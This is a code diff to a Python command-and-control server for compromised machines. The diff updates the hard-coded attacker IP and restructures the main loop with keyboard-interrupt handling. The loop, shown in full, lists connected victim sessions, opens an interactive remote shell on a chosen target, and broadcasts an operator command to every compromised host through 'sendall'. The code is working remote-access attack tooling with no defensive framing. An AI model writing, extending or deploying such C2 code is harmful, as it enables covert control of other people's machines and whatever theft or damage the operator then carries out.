@@ -261,7 +261,7 @@ ips = []
 clients = 0
 stop_thread = False
 
-attack_ip = "192.168.0.107"
+attack_ip = "192.168.0.104"
 listen_port = 54321
 
 sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
@@ -279,34 +279,58 @@ except:
 
 	
 while True:
+	try:
+		command = raw_input("\n[*] Command and Control Centre >>> ")
+		
+		if command == 'sessions':
+			cnt = 1
+			if len(ips) < 1:
+				print(colored("[!] No active session found!\n", "red"))
+				continue
+			for ip in ips:
+				print("Session-" + str(cnt) + " <---> " + str(ip[0]) + ": " + str(ip[1]) + "\n")
+				cnt += 1
+			
+		elif command[:7] == 'session' and command[8:].isdigit():
+			try:
+				sess_num = int(command[8:])
+				tar_num = sess_num-1
+				sess_target = targets[tar_num]
+				sess_ip = ips[tar_num]
+				print("[!] Trying to connect to target " + sess_ip[0])
+				sleep(1)
+				close_request = shell(sess_target, sess_ip)
+				if close_request:																										# on exit, the shell() function returns true
+					targets.remove(sess_target)																							# the list elements containing the corresponding entries
+					ips.remove(sess_ip)																									# along with their IPs are deleted
+			except:	
+				print(colored("[!] No session found under session ID " + str(sess_num) + "\n", "red"))
+			
+		elif command == 'exit' or command == 'quit':
+			print("\n[!] Quitting the Command and Control Center on IP = " + attack_ip + " at Port = " + str(listen_port))
+			for target in targets:
+				target.close()
+			sock.close()
+			stop_thread = True
+			serv_thread.join()
+			quit()
 
-	command = raw_input("\n[*] Command and Control Centre >>> ")
-	
-	if command == 'sessions':
-		cnt = 1
-		if len(ips) < 1:
-			print(colored("[!] No active session found!\n", "red"))
-			continue
-		for ip in ips:
-			print("Session-" + str(cnt) + " <---> " + str(ip[0]) + ": " + str(ip[1]) + "\n")
-			cnt += 1
-		
-	elif command[:7] == 'session' and command[8:].isdigit():
-		try:
-			sess_num = int(command[8:])
-			tar_num = sess_num-1
-			sess_target = targets[tar_num]
-			sess_ip = ips[tar_num]
-			print("[!] Trying to connect to target " + sess_ip[0])
-			sleep(1)
-			close_request = shell(sess_target, sess_ip)
-			if close_request:																										# on exit, the shell() function returns true
-				targets.remove(sess_target)																							# the list elements containing the corresponding entries
-				ips.remove(sess_ip)																									# along with their IPs are deleted
-		except:	
-			print(colored("[!] No session found under session ID " + str(sess_num) + "\n", "red"))
-		
-	elif command == 'exit' or command == 'quit':
+		elif command[:7] == 'sendall':
+			i = 0
+			try:
+				while i < len(targets):
+					tgt = targets[i]
+					SendAll(tgt, command)
+					print("[!!] Command: " + command [8:] + " executed on Target: " + ips[i][0])
+					i += 1
+			except Exception as e:
+				print(colored("[!!] " + str(e), "red"))
+
+		elif command == 'help':
+			print(help_options)
+		else:
+			print(help_options)
+	except KeyboardInterrupt:
 		print("\n[!] Quitting the Command and Control Center on IP = " + attack_ip + " at Port = " + str(listen_port))
 		for target in targets:
 			target.close()
@@ -314,20 +338,4 @@ while True:
 		stop_thread = True
 		serv_thread.join()
 		quit()
-
-	elif command[:7] == 'sendall':
-		i = 0
-		try:
-			while i < len(targets):
-				tgt = targets[i]
-				SendAll(tgt, command)
-				print("[!!] Command: " + command [8:] + " executed on Target: " + ips[i][0])
-				i += 1
-		except Exception as e:
-			print(colored("[!!] " + str(e), "red"))
-
-	elif command == 'help':
-		print(help_options)
-	else:
-		print(help_options)
 
